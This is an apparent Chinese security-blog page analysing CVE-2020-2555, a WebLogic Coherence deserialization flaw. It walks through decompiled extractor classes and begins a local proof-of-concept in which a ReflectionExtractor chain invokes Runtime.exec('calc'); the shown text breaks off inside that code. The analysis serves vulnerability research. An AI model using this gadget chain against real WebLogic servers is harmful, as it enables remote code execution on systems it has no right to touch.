@@ -1,0 +1,662 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>(WebLogic)Coherence 反序列化漏洞 - Twings</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期二, 九月 1日 2020, 8:35 晚上
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    4.9k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      24 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 今年的几个 Coherence 相关反序列化漏洞，搞一波。</p>
+<span id="more"></span>
+
+<hr>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>先简单搭一个 WebLogic 的环境，<a href="https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html">下载地址</a>，WebLogic 中集成了 Coherence ：<a href="https://blog.csdn.net/qq_36868342/article/details/79967606">参考文章</a>。</p>
+<p>然后把后面要用到的两个 jar 提出来放到一个新建的项目里面：<a href="https://www.cnblogs.com/ph4nt0mer/p/13469690.html">参考文章</a>。</p>
+<p>wlfullclient.jar（weblogic 的基本所有功能类），在 wlserver\server\lib 目录下执行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ..\..\modules\com.bea.core.jarbuilder.jar</span><br></pre></td></tr></table></figure>
+
+<p>coherence.jar（coherence 的相关包），找这个 jar 的时候被坑到了，有的文章说在 wlserver\server\lib\console-ext\autodeploy 目录下，我本地查看的时候发现这个 jar 里面并没有关键的 com.tangosol 包，所以后来我自己找了找，找到的 jar 在 coherence\lib 目录下。</p>
+<p>放好 jar 之后在 IDEA 中右键 Add as Library 就可以导入项目，最后是这个样子：</p>
+<p><img src="/css/images/coherence/2020090101.png" srcset="/img/loading.gif"></p>
+<p>zip 压缩包是用 jd-gui 反编译出来的源码包（反编译出来的代码好像对齐了行号，方便调试），用于之后的漏洞分析。</p>
+<h3 id="CVE-2020-2555"><a href="#CVE-2020-2555" class="headerlink" title="CVE-2020-2555"></a>CVE-2020-2555</h3><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>打算从补丁出发自己看一看反序列化链，但是我没有 Support Identifier 好像下载不了补丁，贴一张<a href="https://www.thezdi.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server">参考文章</a>的图吧：</p>
+<p><img src="/css/images/coherence/2020090102.png" srcset="/img/loading.gif"></p>
+<p>可以看到修复是去掉了 LimitFilter 类 toString 函数的 extractor.extract 调用， 所以入口点是 JDK 中的 BadAttributeValueExpException 类，而下一步要寻找一个实现了 ValueExtractor 接口的类，然后观察他的 extract 函数。</p>
+<p>全局搜索一下，可以看到一个包 com.tangosol.util.extractor，我们想找的类都在这里面了，我们一个个看这些 Extractor。</p>
+<h5 id="寻找-extract"><a href="#寻找-extract" class="headerlink" title="寻找 extract"></a>寻找 extract</h5><h6 id="AbstractCompositeExtractor"><a href="#AbstractCompositeExtractor" class="headerlink" title="AbstractCompositeExtractor"></a>AbstractCompositeExtractor</h6><p>没有实现接口，要看它的父类。</p>
+<h6 id="AbstractExtractor"><a href="#AbstractExtractor" class="headerlink" title="AbstractExtractor"></a>AbstractExtractor</h6><p>AbstractCompositeExtractor 的父类，extract 函数实现如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*     */</span>   <span class="keyword">public</span> E <span class="title function_">extract</span><span class="params">(T oTarget)</span> &#123;</span><br><span class="line"><span class="comment">/*  51 */</span>     <span class="keyword">if</span> (oTarget == <span class="literal">null</span>)</span><br><span class="line"><span class="comment">/*     */</span>     &#123;</span><br><span class="line"><span class="comment">/*  53 */</span>       <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"><span class="comment">/*     */</span>     &#125;</span><br><span class="line"><span class="comment">/*  57 */</span>     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>();</span><br><span class="line"><span class="comment">/*     */</span>   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>除了个 return null 就是抛出不可控异常，看起来无法利用。</p>
+<h6 id="ChainedExtractor（链式-extract）"><a href="#ChainedExtractor（链式-extract）" class="headerlink" title="ChainedExtractor（链式 extract）"></a>ChainedExtractor（链式 extract）</h6><p>extract 函数实现如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*     */</span>   <span class="keyword">public</span> E <span class="title function_">extract</span><span class="params">(Object oTarget)</span> &#123;</span><br><span class="line"><span class="comment">/* 102 */</span>     ValueExtractor[] aExtractor = getExtractors();</span><br><span class="line"><span class="comment">/* 103 */</span>     <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, c = aExtractor.length; i &lt; c &amp;&amp; oTarget != <span class="literal">null</span>; i++)</span><br><span class="line"><span class="comment">/*     */</span>     &#123;</span><br><span class="line"><span class="comment">/* 105 */</span>       oTarget = aExtractor[i].extract(oTarget);</span><br><span class="line"><span class="comment">/*     */</span>     &#125;</span><br><span class="line"><span class="comment">/* 108 */</span>     <span class="keyword">return</span> (E)oTarget;</span><br><span class="line"><span class="comment">/*     */</span>   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>是一个链式的 extract 调用，或许可以作为反射链，不过与现在要寻找的利用类无关，先放置一旁。</p>
+<h6 id="ComparisonValueExtractor（compare-compareTo）"><a href="#ComparisonValueExtractor（compare-compareTo）" class="headerlink" title="ComparisonValueExtractor（compare&#x2F;compareTo）"></a>ComparisonValueExtractor（compare&#x2F;compareTo）</h6><p>extract 函数实现如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*     */</span>   <span class="keyword">public</span> E <span class="title function_">extract</span><span class="params">(Object oTarget)</span> &#123;</span><br><span class="line"><span class="comment">/* 135 */</span>     ValueExtractor[] aExtractor = getExtractors();</span><br><span class="line"><span class="comment">/* 136 */</span>     <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> getComparator();</span><br><span class="line"><span class="comment">/* 138 */</span>     <span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> aExtractor[<span class="number">0</span>].extract(oTarget);</span><br><span class="line"><span class="comment">/* 139 */</span>     <span class="type">Object</span> <span class="variable">o2</span> <span class="operator">=</span> aExtractor[<span class="number">1</span>].extract(oTarget);</span><br><span class="line"><span class="comment">/* 141 */</span>     <span class="keyword">if</span> (o1 <span class="keyword">instanceof</span> Number &amp;&amp; o2 <span class="keyword">instanceof</span> Number &amp;&amp; comparator == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="comment">/*     */</span>       ...</span><br><span class="line"><span class="comment">/*     */</span>     &#125; </span><br><span class="line"><span class="comment">/* 229 */</span>     <span class="keyword">return</span> (E)Integer.valueOf(</span><br><span class="line"><span class="comment">/* 230 */</span>         SafeComparator.compareSafe(comparator, o1, o2));</span><br><span class="line"><span class="comment">/*     */</span>   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面有一大段 Number 类型才能执行的代码，跳过，可以看到最后会调用 SafeComparator.compareSafe：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*     */</span>   <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">compareSafe</span><span class="params">(Comparator&lt;Object&gt; comparator, Object o1, Object o2, <span class="type">boolean</span> fNullFirst)</span> &#123;</span><br><span class="line"><span class="comment">/* 218 */</span>     <span class="keyword">if</span> (comparator != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="comment">/*     */</span>       <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">/* 222 */</span>         <span class="keyword">return</span> comparator.compare(o1, o2);</span><br><span class="line"><span class="comment">/*     */</span>       &#125;</span><br><span class="line"><span class="comment">/* 224 */</span>       <span class="keyword">catch</span> (NullPointerException nullPointerException) &#123;&#125;</span><br><span class="line"><span class="comment">/*     */</span>     &#125;</span><br><span class="line"><span class="comment">/* 227 */</span>     <span class="keyword">if</span> (o1 == <span class="literal">null</span>)</span><br><span class="line"><span class="comment">/*     */</span>     &#123;</span><br><span class="line"><span class="comment">/* 229 */</span>       <span class="keyword">return</span> (o2 == <span class="literal">null</span>) ? <span class="number">0</span> : (fNullFirst ? -<span class="number">1</span> : <span class="number">1</span>);</span><br><span class="line"><span class="comment">/*     */</span>     &#125;</span><br><span class="line"><span class="comment">/* 232 */</span>     <span class="keyword">if</span> (o2 == <span class="literal">null</span>)</span><br><span class="line"><span class="comment">/*     */</span>     &#123;</span><br><span class="line"><span class="comment">/* 234 */</span>       <span class="keyword">return</span> fNullFirst ? <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line"><span class="comment">/*     */</span>     &#125;</span><br><span class="line"><span class="comment">/* 237 */</span>     <span class="keyword">return</span> ((Comparable&lt;Object&gt;)o1).compareTo(o2);</span><br><span class="line"><span class="comment">/*     */</span>   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后一个参数 fNullFirst 默认为 true，这里会调用 comparator.compare，可以连接到实现了 Comparator 接口的类的 compare 函数。</p>
+<p>除此之外后面还调用了 compareTo，也可以连接到实现了 Comparable 接口的类的 compareTo 函数。</p>
+<h6 id="ConditionalExtractor"><a href="#ConditionalExtractor" class="headerlink" title="ConditionalExtractor"></a>ConditionalExtractor</h6><p>extract 函数实现如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*     */</span>   <span class="keyword">public</span> E <span class="title function_">extract</span><span class="params">(Object oTarget)</span> &#123;</span><br><span class="line"><span class="comment">/* 157 */</span>     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;ConditionalExtractor may not be used as an extractor.&quot;</span>);</span><br><span class="line"><span class="comment">/*     */</span>   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接抛出了异常，无法利用。</p>
+<h6 id="DeserializationAccelerator"><a href="#DeserializationAccelerator" class="headerlink" title="DeserializationAccelerator"></a>DeserializationAccelerator</h6><p>extract 函数实现如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*     */</span>   <span class="keyword">public</span> Object <span class="title function_">extract</span><span class="params">(Object oTarget)</span> &#123;</span><br><span class="line"><span class="comment">/* 141 */</span>     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;DeserializationAccelerator may not be used as an extractor.&quot;</span>);</span><br><span class="line"><span class="comment">/*     */</span>   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接抛出了异常，无法利用。</p>
+<h6 id="EntryExtractor"><a href="#EntryExtractor" class="headerlink" title="EntryExtractor"></a>EntryExtractor</h6><p>没有实现 extract，用的是父类 AbstractExtractor 的。</p>
+<h6 id="IdentityExtractor（返回参数）"><a href="#IdentityExtractor（返回参数）" class="headerlink" title="IdentityExtractor（返回参数）"></a>IdentityExtractor（返回参数）</h6><p>extract 函数实现如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*     */</span>   <span class="keyword">public</span> T <span class="title function_">extract</span><span class="params">(T target)</span> &#123;</span><br><span class="line"><span class="comment">/*  46 */</span>     <span class="keyword">return</span> target;</span><br><span class="line"><span class="comment">/*     */</span>   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>会直接返回传入的对象，可以配合 ComparisonValueExtractor 使用。</p>
+<h6 id="KeyExtractor"><a href="#KeyExtractor" class="headerlink" title="KeyExtractor"></a>KeyExtractor</h6><p>extract 函数实现如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*     */</span>   <span class="keyword">public</span> E <span class="title function_">extract</span><span class="params">(T oTarget)</span> &#123;</span><br><span class="line"><span class="comment">/* 112 */</span>     <span class="keyword">return</span> (E)<span class="built_in">this</span>.m_extractor.extract(oTarget);</span><br><span class="line"><span class="comment">/*     */</span>   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>又调用了一遍 extract，没有太大意义。</p>
+<h6 id="MultiExtractor（多次-extract）"><a href="#MultiExtractor（多次-extract）" class="headerlink" title="MultiExtractor（多次 extract）"></a>MultiExtractor（多次 extract）</h6><p>extract 函数实现如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*     */</span>   <span class="keyword">public</span> Object <span class="title function_">extract</span><span class="params">(Object oTarget)</span> &#123;</span><br><span class="line"><span class="comment">/*  85 */</span>     <span class="keyword">if</span> (oTarget == <span class="literal">null</span>)</span><br><span class="line"><span class="comment">/*     */</span>     &#123;</span><br><span class="line"><span class="comment">/*  87 */</span>       <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"><span class="comment">/*     */</span>     &#125;</span><br><span class="line"><span class="comment">/*  90 */</span>     ValueExtractor[] aExtractor = getExtractors();</span><br><span class="line"><span class="comment">/*  91 */</span>     <span class="type">int</span> <span class="variable">cExtractors</span> <span class="operator">=</span> aExtractor.length;</span><br><span class="line"><span class="comment">/*  92 */</span>     Object[] aValue = <span class="keyword">new</span> <span class="title class_">Object</span>[cExtractors];</span><br><span class="line"><span class="comment">/*  94 */</span>     <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; cExtractors; i++)</span><br><span class="line"><span class="comment">/*     */</span>     &#123;</span><br><span class="line"><span class="comment">/*  96 */</span>       aValue[i] = aExtractor[i].extract(oTarget);</span><br><span class="line"><span class="comment">/*     */</span>     &#125;</span><br><span class="line"><span class="comment">/*  99 */</span>     <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ImmutableArrayList</span>(aValue);</span><br><span class="line"><span class="comment">/*     */</span>   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>相当于调用了多次 extract，每次调用之间互不影响。</p>
+<h6 id="PofExtractor"><a href="#PofExtractor" class="headerlink" title="PofExtractor"></a>PofExtractor</h6><p>没有实现 extract，用的是父类 AbstractExtractor 的。</p>
+<h6 id="ReflectionExtractor（反射）"><a href="#ReflectionExtractor（反射）" class="headerlink" title="ReflectionExtractor（反射）"></a>ReflectionExtractor（反射）</h6><p>好家伙，一看名字反射就感觉不对劲了，extract 函数实现如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*     */</span>   <span class="keyword">public</span> E <span class="title function_">extract</span><span class="params">(T oTarget)</span> &#123;</span><br><span class="line"><span class="comment">/* 104 */</span>     <span class="keyword">if</span> (oTarget == <span class="literal">null</span>)</span><br><span class="line"><span class="comment">/*     */</span>     &#123;</span><br><span class="line"><span class="comment">/* 106 */</span>       <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"><span class="comment">/*     */</span>     &#125;</span><br><span class="line"><span class="comment">/* 109 */</span>     Class&lt;?&gt; clz = oTarget.getClass();</span><br><span class="line"><span class="comment">/*     */</span>     <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">/* 112 */</span>       <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="built_in">this</span>.m_methodPrev;</span><br><span class="line"><span class="comment">/* 114 */</span>       <span class="keyword">if</span> (method == <span class="literal">null</span> || method.getDeclaringClass() != clz)</span><br><span class="line"><span class="comment">/*     */</span>       &#123;</span><br><span class="line"><span class="comment">/* 116 */</span>         <span class="built_in">this</span>.m_methodPrev = method = ClassHelper.findMethod(clz, </span><br><span class="line"><span class="comment">/* 117 */</span>             getMethodName(), ClassHelper.getClassArray(<span class="built_in">this</span>.m_aoParam), <span class="literal">false</span>);</span><br><span class="line"><span class="comment">/*     */</span>       &#125;</span><br><span class="line"><span class="comment">/* 121 */</span>       <span class="keyword">return</span> (E)method.invoke(oTarget, <span class="built_in">this</span>.m_aoParam);</span><br><span class="line"><span class="comment">/*     */</span>     &#125;</span><br><span class="line"><span class="comment">/* 123 */</span>     <span class="keyword">catch</span> (NullPointerException e) &#123;</span><br><span class="line"><span class="comment">/* 125 */</span>       <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(suggestExtractFailureCause(clz));</span><br><span class="line"><span class="comment">/*     */</span>     &#125;</span><br><span class="line"><span class="comment">/* 127 */</span>     <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">/* 129 */</span>       <span class="keyword">throw</span> ensureRuntimeException(e, clz</span><br><span class="line"><span class="comment">/* 130 */</span>           .getName() + <span class="built_in">this</span> + <span class="string">&#x27;(&#x27;</span> + oTarget + <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line"><span class="comment">/*     */</span>     &#125; </span><br><span class="line"><span class="comment">/*     */</span>   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>确实是好家伙，一个显眼的反射调用函数，配合 ChainedExtractor 似乎可以实现反射链。</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>拼接一下，简单的本地测试代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(Class clz, String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clz.getDeclaredField(fieldName);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!clz.getSuperclass().equals(Object.class)) &#123;</span><br><span class="line">                field = getField(clz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (field != <span class="literal">null</span>) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String fieldName)</span> <span class="keyword">throws</span> IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        <span class="keyword">if</span> (field != <span class="literal">null</span>) &#123;</span><br><span class="line">            field.set(obj, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> bos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(s);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bos);</span><br><span class="line">        oos.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;ThrowableNotThrown&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ValueExtractor[] valueExtractorsArray = <span class="keyword">new</span> <span class="title class_">ValueExtractor</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;, <span class="number">1</span>),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;, <span class="number">1</span>),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedExtractor</span> <span 